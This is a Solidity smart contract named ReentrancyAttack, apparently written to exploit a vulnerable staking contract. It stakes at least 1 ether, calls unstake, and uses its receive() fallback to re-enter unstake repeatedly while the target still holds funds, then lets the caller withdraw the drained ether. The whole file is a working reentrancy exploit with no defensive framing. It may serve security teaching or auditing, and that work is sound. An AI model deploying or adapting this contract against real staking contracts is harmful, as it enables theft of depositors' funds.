// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IStakingContract {
    function stake() external payable;
    function unstake() external;
}

contract ReentrancyAttack {
    IStakingContract public stakingContract;

    constructor(address _stakingContractAddress) {
        stakingContract = IStakingContract(_stakingContractAddress);
    }

    // Fallback function to receive ETH and perform reentrancy
    receive() external payable {
        if (address(stakingContract).balance >= 1 ether) { // You can adjust the condition based on your scenario
            stakingContract.unstake();
        }
    }

    // Function to deposit ETH to the staking contract
    function attack() public payable {
        require(msg.value >= 1 ether);
        stakingContract.stake{value: msg.value}();
        stakingContract.unstake();
    }

    // Function to withdraw ETH from this contract
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Helper function to check balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
